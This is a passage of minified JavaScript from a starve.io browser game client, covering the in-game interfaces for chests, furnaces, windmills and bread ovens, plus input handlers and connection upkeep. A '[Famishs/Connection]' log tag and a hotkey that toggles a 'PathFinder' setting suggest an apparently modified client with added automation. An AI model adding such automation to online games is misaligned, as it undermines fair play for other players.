                                xe.chest.lockpick = !1,
                                xe.chest.padlock = !1,
                                xe.chest.open = !1;
                            var U = Fe.fast_units[xe.uid]
                                , Y = Ue.DIST_CHEST;
                            if (U) {
                                for (var g, F = 0; F < Fe.units[Ye.CHEST].length; F++) {
                                    var p = Fe.units[Ye.CHEST][F]
                                        , x = Utils.dist(p, U);
                                    x < Y && (Y = x,
                                        xe.chest.open = !0,
                                        xe.chest.id = p.action < 2 ? -1 : Math.floor((p.action - 1) / 2),
                                        xe.chest.amount = p.info,
                                        xe.chest.pid = p.pid,
                                        xe.chest.iid = p.id,
                                        xe.chest.locked = p.lock,
                                        xe.chest.lock = !(!p.lock || xe.id == p.pid || xe.in_team(p.pid)),
                                        xe.chest.padlock = p.pid === xe.id && !xe.chest.locked && -1 != xe.inv.find_item(Be.LOCK),
                                        xe.chest.locked) && -1 != xe.inv.find_item(Be.LOCKPICK) && (xe.chest.lockpick = !0)
                                }
                                Y < Ue.DIST_CHEST && (h = sprite[ze.CHEST_SLOT],
                                    g = Je.chest_buttons[0],
                                    C = Math.floor(g.info.translate.x + (g.info.img[0].width - h.width) / 2),
                                    R = Math.floor(g.info.translate.y + (g.info.img[0].height - h.height) / 2) + 3,
                                    Ke(fe, h, C, R),
                                    (!xe.chest.lock || xe.chest.pid === xe.id) && 0 <= xe.chest.id && ((g = Je.chest_buttons[xe.chest.id]).draw(fe),
                                        1 < (h = xe.chest.amount)) && Y0(h, g),
                                    xe.chest.lock ? Je.chest_locked.draw(fe) : xe.chest.padlock && Je.chest_padlock.draw(fe),
                                    xe.chest.lockpick) && Je.chest_lockpick.draw(fe)
                            }
                            if (!xe.chest.open) {
                                xe.furnace.amount = 0,
                                    xe.furnace.open = !1;
                                var J = Fe.fast_units[xe.uid]
                                    , X = Ue.DIST_FURNACE;
                                if (J) {
                                    for (var R, C, j = 0; j < Fe.units[Ye.FURNACE].length; j++) {
                                        var b = Fe.units[Ye.FURNACE][j]
                                            , q = Utils.dist(b, J);
                                        q < X && (X = q,
                                            xe.furnace.open = !0,
                                            xe.furnace.amount = b.info,
                                            xe.furnace.pid = b.pid,
                                            xe.furnace.iid = b.id)
                                    }
                                    X < Ue.DIST_FURNACE && (C = sprite[ze.FURNACE_SLOT],
                                        R = Je.furnace_button,
                                        h = Math.floor(R.info.translate.x + (R.info.img[0].width - C.width) / 2),
                                        N = Math.floor(R.info.translate.y + (R.info.img[0].height - C.height) / 2) + 3,
                                        Ke(fe, C, h, N),
                                        0 < xe.furnace.amount) && (R.draw(fe),
                                            1 < (C = xe.furnace.amount)) && Y0(C, R)
                                }
                            }
                            if (!(xe.chest.open || xe.furnace.open || xe.windmill.open || xe.bread_oven.open || xe.extractor.open)) {
                                xe.well.open = !1;
                                var Z = Fe.fast_units[xe.uid]
                                    , Q = Ue.DIST_WELL;
                                if (Z)
                                    for (var $ = 0; $ < Fe.units[Ye.WELL].length; $++) {
                                        var ee = Fe.units[Ye.WELL][$]
                                            , te = Utils.dist(ee, Z);
                                        te < Q && (Q = te,
                                            xe.well.open = !0,
                                            xe.well.pid = ee.pid,
                                            xe.well.iid = ee.id)
                                    }
                            }
                            if (!xe.chest.open && !xe.furnace.open) {
                                xe.windmill.open = !1;
                                var ie = Fe.fast_units[xe.uid]
                                    , ne = Ue.DIST_WINDMILL;
                                if (ie) {
                                    for (var N, re = 0; re < Fe.units[Ye.WINDMILL].length; re++) {
                                        var S = Fe.units[Ye.WINDMILL][re]
                                            , oe = Utils.dist(S, ie);
                                        oe < ne && (ne = oe,
                                            xe.windmill.open = !0,
                                            xe.windmill.amount_wheat = 255 & S.info,
                                            xe.windmill.amount_flour = (65280 & S.info) >> 8,
                                            xe.windmill.pid = S.pid,
                                            xe.windmill.iid = S.id)
                                    }
                                    ne < Ue.DIST_WINDMILL && (h = sprite[ze.WINDMILL_CASES],
                                        Te = (N = Je.windmill_wheat_button).info.translate.x - 33,
                                        Ke(fe, h, Te, 0),
                                        0 < xe.windmill.amount_wheat && (N.draw(fe),
                                            1 < (M = xe.windmill.amount_wheat)) && Y0(M, N),
                                        N = Je.windmill_flour_button,
                                        0 < xe.windmill.amount_flour) && (N.draw(fe),
                                            1 < (M = xe.windmill.amount_flour)) && Y0(M, N)
                                }
                            }
                            if (!xe.chest.open && !xe.furnace.open) {
                                xe.extractor.open = !1;
                                var ae = Fe.fast_units[xe.uid]
                                    , se = Ue.DIST_EXTRACTOR_MACHINE;
                                if (ae) {
                                    for (var m = 0; m < o2.length; m++)
                                        for (var _e = o2[m][0], Ee = o2[m][1], ue = 0; ue < Fe.units[_e].length; ue++) {
                                            var D = Fe.units[_e][ue]
                                                , de = Utils.dist(D, ae);
                                            de < se && (se = de,
                                                xe.extractor.mineral = Ee,
                                                xe.extractor.type = _e,
                                                xe.extractor.open = !0,
                                                xe.extractor.amount_wood = 255 & D.info,
                                                xe.extractor.amount_mineral = (65280 & D.info) >> 8,
                                                xe.extractor.pid = D.pid,
                                                xe.extractor.iid = D.id)
                                        }
                                    if (se < Ue.DIST_EXTRACTOR_MACHINE) {
                                        var h = sprite[ze.EXTRACTOR_CASES]
                                            , Te = (v = Je.extractor_wood_button).info.translate.x - 33;
                                        switch (Ke(fe, h, Te, 0),
                                        0 < xe.extractor.amount_wood && (v.draw(fe),
                                            1 < (f = xe.extractor.amount_wood)) && Y0(f, v),
                                        xe.extractor.mineral) {
                                            case Be.STONE:
                                                var v = Je.extractor_stone_button;
                                                break;
                                            case Be.GOLD:
                                                v = Je.extractor_gold_button;
                                                break;
                                            case Be.DIAMOND:
                                                v = Je.extractor_diamond_button;
                                                break;
                                            case Be.AMETHYST:
                                                v = Je.extractor_amethyst_button;
                                                break;
                                            case Be.REIDITE:
                                                v = Je.extractor_reidite_button
                                        }
                                        0 < xe.extractor.amount_mineral && (v.draw(fe),
                                            1 < (f = xe.extractor.amount_mineral)) && Y0(f, v)
                                    }
                                }
                            }
                            if (!(xe.chest.open || xe.furnace.open || xe.windmill.open || xe.extractor.open)) {
                                xe.bread_oven.open = !1;
                                var Ae = Fe.fast_units[xe.uid]
                                    , he = Ue.DIST_BREAD_OVEN;
                                if (Ae) {
                                    for (var M, f, le = 0; le < Fe.units[Ye.BREAD_OVEN].length; le++) {
                                        var L = Fe.units[Ye.BREAD_OVEN][le]
                                            , Ie = Utils.dist(L, Ae);
                                        Ie < he && (he = Ie,
                                            xe.bread_oven.open = !0,
                                            xe.bread_oven.amount_wood = 31 & L.info,
                                            xe.bread_oven.amount_flour = (992 & L.info) >> 5,
                                            xe.bread_oven.amount_bread = (31744 & L.info) >> 10,
                                            xe.bread_oven.pid = L.pid,
                                            xe.bread_oven.iid = L.id)
                                    }
                                    he < Ue.DIST_BREAD_OVEN && (M = sprite[ze.BREAD_OVEN_UI],
                                        f = (h = Je.bread_oven_wood_button).info.translate.x - 32,
                                        Ke(fe, M, f, 0),
                                        0 < xe.bread_oven.amount_wood && (h.draw(fe),
                                            1 < (y = xe.bread_oven.amount_wood)) && Y0(y, h),
                                        h = Je.bread_oven_bread_button,
                                        0 < xe.bread_oven.amount_bread && (h.draw(fe),
                                            1 < (y = xe.bread_oven.amount_bread)) && Y0(y, h),
                                        h = Je.bread_oven_flour_button,
                                        0 < xe.bread_oven.amount_flour) && (h.draw(fe),
                                            1 < (y = xe.bread_oven.amount_flour)) && Y0(y, h)
                                }
                            }
                            if (!(xe.chest.open || xe.furnace.open || xe.windmill.open || xe.bread_oven.open || xe.extractor.open)) {
                                xe.sign.open = !1;
                                var ce = Fe.fast_units[xe.uid]
                                    , Oe = Ue.DIST_SIGN;
                                if (ce) {
                                    for (var ge = 0; ge < Fe.units[Ye.SIGN].length; ge++) {
                                        var G = Fe.units[Ye.SIGN][ge]
                                            , pe = Utils.dist(G, ce);
                                        pe < Oe && 0 === G.info && G.pid === xe.id && (xe.sign.open = !0,
                                            Oe = pe,
                                            xe.sign.iid = G.id)
                                    }
                                    Oe < Ue.DIST_SIGN && Je.sign.button.draw(fe)
                                }
                            }
                            F0(),
                                U0()
                        }
                        if (xe.ghost.enabled) {
                            xe.resurrection.open = !1;
                            var Re = Fe.fast_units[xe.uid]
                                , Ce = Ue.DIST_RESURRECTION;
                            if (Re) {
                                for (var be = 0; be < Fe.units[Ye.RESURRECTION].length; be++) {
                                    var Ne = Fe.units[Ye.RESURRECTION][be]
                                        , Se = Utils.dist(Ne, Re);
                                    Se < Ce && (Ce = Se,
                                        xe.resurrection.open = !0,
                                        xe.resurrection.pid = Ne.pid,
                                        xe.resurrection.iid = Ne.id)
                                }
                                Ce < Ue.DIST_RESURRECTION && Je.resurrection.draw(fe)
                            }
                        }
                        if (xe.bigmap) {
                            fe.globalAlpha = .5,
                                fe.fillStyle = "#000",
                                fe.fillRect(0, 0, Le, Ge),
                                fe.globalAlpha = .8;
                            var y = sprite[ze.BIGMAP][Fe.time]
                                , H = ye - y.width / 2
                                , P = He - y.height / 2;
                            Ke(fe, y, H, P),
                                -(fe.globalAlpha = 1) < Je.minimap.marker.x && (fe.fillStyle = "#660000",
                                    ke(fe, H + 3 * Je.minimap.marker.x * Pe, P + 3 * Je.minimap.marker.y * Pe, 14 * Pe),
                                    fe.fill());
                            for (var me = Je.minimap.players, De = 0; De < me.length; De++) {
                                var ve = me[De];
                                fe.fillStyle = (Fe.time,
                                    "#ff0000"),
                                    ke(fe, H + ve.x / (100 * Fe.nw) * 600 * Pe, P + ve.y / (100 * Fe.nh) * 600 * Pe, 6 * Pe),
                                    fe.fill()
                            }
                            y = Fe.fast_units[xe.uid];
                            y && (fe.fillStyle = Fe.time ? "#fff" : "#e39716",
                                ke(fe, H + y.x / (100 * Fe.nw) * 600 * Pe, P + y.y / (100 * Fe.nh) * 600 * Pe, 12 * Pe),
                                fe.fill())
                        }
                        this.show_ui && 1 === this.show_clock && (h = Fe.clock,
                            e = sprite[ze.CLOCK][Fe.time],
                            Ke(fe, e, h.translate.x, h.translate.y),
                            fe.save(),
                            fe.translate(h.translate.x + e.width / 2, h.translate.y + e.height / 2),
                            Fe.clock.now = ((new Date).getTime() - h.init + h.hour) % Ue.DAY,
                            h = 2 * Math.PI * Fe.clock.now / Ue.DAY - Math.PI / 2,
                            fe.rotate(h),
                            Ke(fe, sprite[ze.ARROW_CLOCK], -e.width / 2, -e.height / 2),
                            fe.restore()),
                            xe.welcome.draw(),
                            xe.alert.draw("#FFF", "#000"),
                            this.show_ui && (xe.ghost.draw(),
                                xe.shop.draw(),
                                xe.inv.drag.draw(je.pos.x, je.pos.y)),
                            xe.reconnect.enabled && (fe.globalAlpha = .9,
                                fe.fillStyle = "#000",
                                Ve(fe, ye - 150, He - 90, 300, 180, 15),
                                fe.fill(),
                                fe.globalAlpha = 1,
                                h = sprite[ze.GEAR2],
                                fe.save(),
                                xe.reconnect.rotate = (xe.reconnect.rotate + 2 * qe) % (2 * Math.PI),
                                fe.translate(Le / 2, Ge / 2 - 25),
                                fe.rotate(xe.reconnect.rotate),
                                Ke(fe, h, -h.width / 2, -h.height / 2),
                                fe.restore(),
                                h = sprite[ze.RECONNECT],
                                Ke(fe, h, (Le - h.width) / 2, (Ge - h.height) / 2 + 25))
                    }
                    ,
                    this.update_scene = function () {
                        xe.cam.update(),
                            xe.gauges.update(),
                            !xe.reconnect.enabled && xe.alive && (xe.control.update(),
                                xe.auto_feed.update()),
                            Fe.update(),
                            this.quests.update_chrono()
                    }
                    ,
                    this.draw_scene = function () {
                        Fr()
                    }
                    ,
                    this.update_connection = function () {
                        try {
                            client.check_state(),
                                client.check_pong(),
                                client.try_ping(),
                                client.update_cam()
                        } catch (e) {
                            console.log("[Famishs/Connection] Connection is lost , restoring session"),
                                client.lost()
                        }
                    }
                    ,
                    this.draw = function () {
                        var e;
                        !xe.reconnect.enabled && xe.alive && this.update_connection(),
                            Xe.scheduler(),
                            this.update_scene(),
                            1 !== window.antiCheat.isDetected ? (this.draw_scene(),
                                this.draw_UI()) : (e = IMAGES.CHEATING_BOX,
                                    Ke(Me, e, ye - e.width / 4, He - e.height / 4, e.width / 2, e.height / 2))
                    }
                    ,
                    this.trigger_keyup = function (e) {
                        var t, i;
                        xe.chat.open && 27 === e.keyCode ? xe.chat.quit() : xe.terminal.open && 27 === e.keyCode ? xe.terminal.quit() : xe.chat.open || xe.terminal.open || 79 != e.keyCode || -1 != _ ? 13 == e.keyCode && -1 == _ ? xe.terminal.open ? xe.terminal._send() : xe.chat.run() : xe.chat.open || xe.terminal.open || (82 === e.keyCode ? xe.auto_feed.invert() : 80 !== e.keyCode || Fe.mode !== Ue.MODE_HUNGER_GAMES || xe.spectator ? 49 <= e.keyCode && e.keyCode <= 57 ? xe.craft.id < 0 && (t = e.keyCode - 49,
                            i = xe.inv.can_select[t]) && client.select_inv(i.id, t) : 89 == e.keyCode ? xe.bigmap = !xe.bigmap : 71 == e.keyCode && xe.craft.change_mode() : xe.show_spectators.invert()) : xe.terminal._open(),
                            Ao.up(e)
                    }
                    ,
                    this.trigger_keydown = function (e) {
                        Ao.down(e),
                            8 != e.keyCode || xe.chat.open || xe.terminal.open || e.preventDefault(),
                            xe.chat.open || xe.terminal.open || e.code === Settings.PathFinder.k && (Settings.PathFinder.e = !Settings.PathFinder.e)
                    }
                    ,
                    this.trigger_mousedown = function (e) {
                        je.pos = Zr(d.can, e);
                        var t, i = !1, n = (xe.craft.preview < 0 && d.minimap.focus(je.pos),
                            xe.chest), e = (xe.craft.id < 0 && 0 <= n.id && (xe.chest.lock && xe.chest.pid !== xe.id || (i |= d.chest_buttons[xe.chest.id].trigger(d.can, je.pos, Jr))),
                                xe.windmill), e = (e.open && 0 < e.amount_flour && (i |= d.windmill_flour_button.trigger(d.can, je.pos, Jr)),
                                    xe.extractor), e = (e.open && 0 < e.amount_mineral && (i = (i = (i = (i = (i |= d.extractor_stone_button.trigger(d.can, je.pos, Jr)) | d.extractor_gold_button.trigger(d.can, je.pos, Jr)) | d.extractor_diamond_button.trigger(d.can, je.pos, Jr)) | d.extractor_amethyst_button.trigger(d.can, je.pos, Jr)) | d.extractor_reidite_button.trigger(d.can, je.pos, Jr)),
                                        xe.bread_oven);
                        if (e.open && 0 < e.amount_bread && (i |= d.bread_oven_bread_button.trigger(d.can, je.pos, Jr)),
                            xe.sign.open && (i |= d.sign.button.trigger(d.can, je.pos, Jr)),
                            xe.chest.lock || xe.chest.padlock && (i |= d.chest_padlock.trigger(d.can, je.pos, Jr)),
                            xe.chest.lockpick && (i |= d.chest_lockpick.trigger(d.can, je.pos, Jr)),
                            xe.craft.id < 0 && !d.craft_list.open && !d.safe_delete.open && !d.safe_cancel.open && !d.quests.open && !d.options.open && !d.market.open)
                            for (var r = xe.inv.can_select, o = 0; o < r.length; o++) {
                                var a = r[o].trigger(d.can, je.pos, Jr);
                                i |= a,
                                    a && xe.inv.drag.start(o, je.pos),
                                    (n.open && (n.id < 0 || n.id == r[o].id) || xe.furnace.open && r[o].id === Be.WOOD || xe.well.open && r[o].id === Be.BUCKET_FULL || xe.bread_oven.open && (r[o].id === Be.WOOD || r[o].id === Be.FLOUR) || xe.windmill.open && r[o].id === Be.WILD_WHEAT || xe.extractor.open && r[o].id === Be.WOOD) && (i |= d.plus_buttons[r[o].id].trigger(d.can, je.pos, Jr))
                            }
                        if (xe.resurrection.open && (i |= d.resurrection.trigger(d.can, je.pos, Jr)),
                            -1 != d.team_buttons_id ? (i |= d.team_buttons[d.team_buttons_id].button.trigger(d.can, je.pos, Jr)) && (t = !0) : t = !1,
                            !(!(xe.craft.id < 0 && xe.craft.preview < 0) || t || d.craft_list.open || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.market.open || xe.zombie))
                            for (r = xe.craft.can_craft,
                                o = 0; o < r.length; o++)
                                i |= r[o].trigger(d.can, je.pos, Jr);
                        !(xe.craft.id < 0 && xe.craft.preview < 0 && xe.shop.open) || d.craft_list.open || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.quests.open || d.market.open || (i |= d.shop.button.trigger(d.can, je.pos, Jr)),
                            !(xe.craft.preview < 0) || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.quests.open || d.market.open || (i |= d.craft_list.button.trigger(d.can, je.pos, Jr)),
                            !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.safe_cancel.open || d.quests.open || d.market.open || (i |= d.options.button.trigger(d.can, je.pos, Jr)),
                            !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.safe_cancel.open || d.quests.open || d.options.open || (i |= d.market.button.trigger(d.can, je.pos, Jr)),
                            !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.safe_cancel.open || d.quests.open || d.options.open || d.market.open || (Xe.run ? i |= d.audio.button_on.trigger(d.can, je.pos, Jr) : i |= d.audio.button_off.trigger(d.can, je.pos, Jr)),
                            !(xe.craft.preview < 0) || d.craft_list.open || d.market.open || d.safe_delete.open || d.options.open || d.safe_cancel.open || Fe.mode === Ue.MODE_ZOMBIES || Fe.mode === Ue.MODE_LEGACY || Fe.mode === Ue.MODE_BR || (i |= d.quests.button.trigger(d.can, je.pos, Jr)),
                            i || d.craft_list.open || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.quests.open || d.market.open || d.sign.open || (0 <= xe.craft.preview ? client.send_build() : t || je.down())
                    }
                    ,
                    this.trigger_mouseup = function (e) {
                        if (je.pos = Zr(d.can, e),
                            je.up(),
                            !xe.inv.drag.release()) {
                            var t, i, n, r = xe.chest, o = xe.furnace, a = xe.well;
                            xe.windmill,
                                xe.extractor,
                                xe.bread_oven;
                            if (xe.control.attack && (xe.control.attack = 0,
                                client.stop_attack()),
                                -1 != d.team_buttons_id) {
                                var s = d.team_buttons[d.team_buttons_id].button.trigger(d.can, je.pos, Xr)
                                    , _ = document.getElementById("team_box").style;
                                if (s && "inline-block" == _.display)
                                    return void (_.display = "none");
                                s && d.team_buttons[d.team_buttons_id].action()
                            }
                            if (xe.craft.id < 0 && 0 <= r.id && !d.safe_delete.open && (xe.chest.lock && xe.chest.pid !== xe.id || (s = d.chest_buttons[xe.chest.id].trigger(d.can, je.pos, Xr)) && client.take_chest(r)),
                                (t = xe.windmill).open && 0 < t.amount_flour && !d.safe_delete.open && (s = d.windmill_flour_button.trigger(d.can, je.pos, Xr)) && client.take_flour(t),
                                (i = xe.extractor).open && 0 < i.amount_mineral && !d.safe_delete.open)
                                switch (i.type) {
                                    case Ye.EXTRACTOR_MACHINE_STONE:
                                        (s = d.extractor_stone_button.trigger(d.can, je.pos, Xr)) && client.take_extractor(i);
                                        break;
                                    case Ye.EXTRACTOR_MACHINE_GOLD:
                                        (s = d.extractor_gold_button.trigger(d.can, je.pos, Xr)) && client.take_extractor(i);
                                        break;
                                    case Ye.EXTRACTOR_MACHINE_DIAMOND:
                                        (s = d.extractor_diamond_button.trigger(d.can, je.pos, Xr)) && client.take_extractor(i);
                                        break;
                                    case Ye.EXTRACTOR_MACHINE_AMETHYST:
                                        (s = d.extractor_amethyst_button.trigger(d.can, je.pos, Xr)) && client.take_extractor(i);
                                        break;
                                    case Ye.EXTRACTOR_MACHINE_REIDITE:
                                        (s = d.extractor_reidite_button.trigger(d.can, je.pos, Xr)) && client.take_extractor(i)
                                }
                            if ((n = xe.bread_oven).open && 0 < n.amount_bread && !d.safe_delete.open && (s = d.bread_oven_bread_button.trigger(d.can, je.pos, Xr)) && client.take_bread(n),
                                xe.sign.open && !d.safe_delete.open && (s = d.sign.button.trigger(d.can, je.pos, Xr)) && d.sign.select(),
                                xe.chest.lock || d.safe_delete.open || xe.chest.padlock && (s = d.chest_padlock.trigger(d.can, je.pos, Xr)) && client.lock_chest(r),
                                xe.chest.lockpick && !d.safe_delete.open && (s = d.chest_lockpick.trigger(d.can, je.pos, Xr)) && client.unlock_chest(r),
                                !xe.resurrection.open || (s = d.resurrection.trigger(d.can, je.pos, Xr)) && client.resurrection(),
                                xe.craft.id < 0 && !xe.ghost.enabled && !d.safe_delete.open)
                                for (var E = xe.inv.can_select, u = 0; u < E.length; u++)
                                    (s = E[u].trigger(d.can, je.pos, Xr)) ? 1 != e.which || e.shiftKey ? (1 == e.which && e.shiftKey || 3 == e.which) && xe.craft.preview < 0 && d.safe_delete.del(E[u].id) : client.select_inv(E[u].id, u) : r.open && (r.id < 0 || r.id === E[u].id) ? (s = d.plus_buttons[E[u].id].trigger(d.can, je.pos, Xr)) && xe.craft.preview < 0 && client.give_item(r, E[u].id, e.shiftKey ? 10 : 1) : a.open && E[u].id === Be.BUCKET_FULL ? (s = d.plus_buttons[E[u].id].trigger(d.can, je.pos, Xr)) && xe.craft.preview < 0 && client.give_well(a) : o.open && E[u].id === Be.WOOD ? (s = d.plus_buttons[E[u].id].trigger(d.can, je.pos, Xr)) && xe.craft.preview < 0 && client.give_wood(o, e.shiftKey ? 10 : 1) : t.open && E[u].id === Be.WILD_WHEAT ? (s = d.plus_buttons[E[u].id].trigger(d.can, je.pos, Xr)) && xe.craft.preview < 0 && client.give_wheat(t, e.shiftKey ? 10 : 1) : i.open && E[u].id === Be.WOOD ? (s = d.plus_buttons[E[u].id].trigger(d.can, je.pos, Xr)) && xe.craft.preview < 0 && client.give_wood_extractor(i, e.shiftKey ? 10 : 1) : !n.open || E[u].id !== Be.WOOD && E[u].id !== Be.FLOUR || (s = d.plus_buttons[E[u].id].trigger(d.can, je.pos, Xr)) && xe.craft.preview < 0 && (E[u].id === Be.WOOD ? client.give_bread_oven(n, e.shiftKey ? 10 : 1, 0) : client.give_bread_oven(n, 0, e.shiftKey ? 10 : 1));
                            if (xe.craft.id < 0 && xe.craft.preview < 0 && !xe.ghost.enabled && !d.safe_delete.open && !xe.zombie)
                                for (E = xe.craft.can_craft,
                                    u = 0; u < E.length; u++)
                                    (s = E[u].trigger(d.can, je.pos, Xr)) && (ret = client.select_craft(E[u].id));
                            !(xe.craft.id < 0 && xe.craft.preview < 0 && xe.shop.open) || d.market.open || d.craft_list.open || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.quests.open || (s = d.shop.button.trigger(d.can, je.pos, xr)) && Je.shop.select(),
                                !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.market.open || d.safe_cancel.open || d.quests.open || d.options.open || (Xe.run ? (s = d.audio.button_on.trigger(d.can, je.pos, Xr)) && Xe.select() : (s = d.audio.button_off.trigger(d.can, je.pos, Xr)) && Xe.select()),
                                !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.safe_cancel.open || d.quests.open || d.market.open || (s = d.options.button.trigger(d.can, je.pos, Xr)) && d.options.select_options(),
                                !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.safe_cancel.open || d.quests.open || d.options.open || 1 !== d.show_market || (s = d.market.button.trigger(d.can, je.pos, Xr)) && d.market.select(),
                                !(xe.craft.preview < 0) || d.safe_delete.open || d.market.open || d.options.open || d.safe_cancel.open || d.quests.open || 1 !== d.show_recipe_book || (s = d.craft_list.button.trigger(d.can, je.pos, Xr)) && d.craft_list.select_book(),
                                !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.market.open || Fe.mode === Ue.MODE_ZOMBIES || Fe.mode === Ue.MODE_LEGACY || Fe.mode === Ue.MODE_BR || 1 !== d.show_quest || (s = d.quests.button.trigger(d.can, je.pos, Xr)) && d.quests.select(),
                                xe.craft.crafting && 3 == e.which && d.safe_cancel.del()
                        }
                    }
                    ,
                    this.current_cursor = !1,
                    this.trigger_mousemove = function (e) {
                        je.pos = Zr(d.can, e);
                        var t = !1
                            , e = (Je.info_box.display = 0,
                                xe.inv.drag.move(je.pos),
                                -1 != d.team_buttons_id && (t |= d.team_buttons[d.team_buttons_id].button.trigger(d.can, je.pos, xr)),
                                xe.windmill)
                            , e = (e.open && 0 < e.amount_flour && (t |= d.windmill_flour_button.trigger(d.can, je.pos, xr)),
                                xe.extractor)
                            , e = (e.open && 0 < e.amount_mineral && (t = (t = (t = (t = (t |= d.extractor_stone_button.trigger(d.can, je.pos, xr)) | d.extractor_gold_button.trigger(d.can, je.pos, xr)) | d.extractor_diamond_button.trigger(d.can, je.pos, xr)) | d.extractor_amethyst_button.trigger(d.can, je.pos, xr)) | d.extractor_reidite_button.trigger(d.can, je.pos, xr)),
                                xe.bread_oven)
                            , i = (e.open && 0 < e.amount_bread && (t |= d.bread_oven_bread_button.trigger(d.can, je.pos, xr)),
                                xe.sign.open && (t |= d.sign.button.trigger(d.can, je.pos, xr)),
                                xe.chest);
                        if (xe.craft.id < 0 && 0 <= i.id && !xe.ghost.enabled && (xe.chest.lock && xe.chest.pid !== xe.id || (t |= d.chest_buttons[i.id].trigger(d.can, je.pos, xr))),
                            xe.resurrection.open && (t |= d.resurrection.trigger(d.can, je.pos, xr)),
                            xe.chest.lock || xe.ghost.enabled || xe.chest.padlock && (t |= d.chest_padlock.trigger(d.can, je.pos, xr)),
                            xe.chest.lockpick && !xe.ghost.enabled && (t |= d.chest_lockpick.trigger(d.can, je.pos, xr)),
                            xe.craft.id < 0 && !xe.ghost.enabled)
                            for (var n = xe.inv.can_select, r = 0; r < n.length; r++) {
                                var o = n[r].trigger(d.can, je.pos, xr);
                                t |= Je.info_box.trigger(o, n[r], 0),
                                    (i.open && (i.id < 0 || i.id == n[r].id) || xe.furnace.open && n[r].id == Be.WOOD || xe.well.open && n[r].id === Be.BUCKET_FULL || xe.bread_oven.open && (n[r].id == Be.WOOD || n[r].id == Be.FLOUR) || xe.windmill.open && n[r].id == Be.WILD_WHEAT || xe.extractor.open && n[r].id == Be.WOOD) && (t |= d.plus_buttons[n[r].id].trigger(d.can, je.pos, xr))
                            }
                        if (xe.craft.id < 0 && xe.craft.preview < 0 && !xe.ghost.enabled && !xe.zombie)
                            for (n = xe.craft.can_craft,
                                r = 0; r < n.length; r++)
                                o = !1,
                                    o = n[r].trigger(d.can, je.pos, xr),
                                    t |= Je.info_box.trigger(o, n[r], 1);
                        !(xe.craft.id < 0 && xe.craft.preview < 0 && xe.shop.open) || d.craft_list.open || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.quests.open || d.market.open || (t |= d.shop.button.trigger(d.can, je.pos, xr)),
                            !(xe.craft.preview < 0) || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.quests.open || d.market.open || 1 !== d.show_recipe_book || (t |= d.craft_list.button.trigger(d.can, je.pos, xr)),
                            !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.safe_cancel.open || d.quests.open || d.market.open || (t |= d.options.button.trigger(d.can, je.pos, xr)),
                            !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.safe_cancel.open || d.quests.open || d.options.open || 1 !== d.show_market || (t |= d.market.button.trigger(d.can, je.pos, xr)),
                            !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.safe_cancel.open || d.quests.open || d.options.open || d.market.open || (Xe.run ? t |= d.audio.button_on.trigger(d.can, je.pos, xr) : t |= d.audio.button_off.trigger(d.can, je.pos, xr)),
                            !(xe.craft.preview < 0) || d.craft_list.open || d.safe_delete.open || d.options.open || d.safe_cancel.open || d.market.open || Fe.mode === Ue.MODE_ZOMBIES || Fe.mode === Ue.MODE_LEGACY || Fe.mode === Ue.MODE_B || 1 !== d.show_quest || (t |= d.quests.button.trigger(d.can, je.pos, xr)),
                            d.current_cursor !== t && (d.current_cursor = t,
                                a.style.cursor = t ? d.cursor1 : d.cursor0)
                    }
                    ,
                    this.add_event_listener = function () {
                        window.addEventListener("mousedown", this.trigger_mousedown, !1),
                            window.addEventListener("mouseup", this.trigger_mouseup, !1),
                            window.addEventListener("mousemove", this.trigger_mousemove, !1),
                            window.addEventListener("keyup", this.trigger_keyup, !1),
                            window.addEventListener("keydown", this.trigger_keydown, !1)
                    }
                    ,
                    this.remove_event_listener = function () {
                        window.removeEventListener("mousedown", this.trigger_mousedown, !1),
                            window.removeEventListener("mouseup", this.trigger_mouseup, !1),
                            window.removeEventListener("mousemove", this.trigger_mousemove, !1),
                            window.removeEventListener("keyup", this.trigger_keyup, !1),
                            window.removeEventListener("keydown", this.trigger_keydown, !1)
                    }
            }
            function D2() {
                Utils.open_in_new_box("https://twitter.com/intent/tweet?text=I%20survived%20" + xe.day + "%20days%20with%20" + xe.die.score + "%20points%20in%20http%3A%2F%2Fstarve.io%2F%20%23starve.io")
            }
            function v2() {
                Utils.open_in_new_box("https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.starve.io%2F&display=popup&ref=plugin&src=like&kid_directed_site=0")
            }
            function M2(e, t) {
                this.can = e,
                    this.ctx = t;
                var i = this;
                this.enable_interface = !1,
                    this.sb = {
                        id: document.getElementById("scoreboard"),
                        style: document.getElementById("scoreboard").style,
                        height: 0,
                        translate: {
                            x: 0,
                            y: 0
                        },
                        update: function () {
                            this.style.left = this.translate.x + "px",
                                this.style.top = this.translate.y + "px"
                        },
                        init: function () {
                            var i;
